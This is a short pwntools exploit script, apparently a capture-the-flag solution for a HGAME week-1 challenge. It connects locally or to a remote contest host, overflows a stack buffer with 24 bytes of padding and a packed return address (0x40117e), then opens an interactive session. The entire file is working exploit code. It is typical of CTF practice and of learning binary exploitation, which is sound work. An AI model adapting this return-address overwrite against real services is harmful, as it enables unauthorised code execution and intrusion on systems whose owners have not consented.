from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

debug = True

elf = ELF("./vuln")
if debug:
    io = process("./vuln")
else:
    io = remote("week-1.hgame.lwsec.cn", 30800)


def tdebug():
    gdb.attach(io)
    pause()


io.sendline(b'a' * 8 * 3 + p64(0x40117e))
io.interactive()
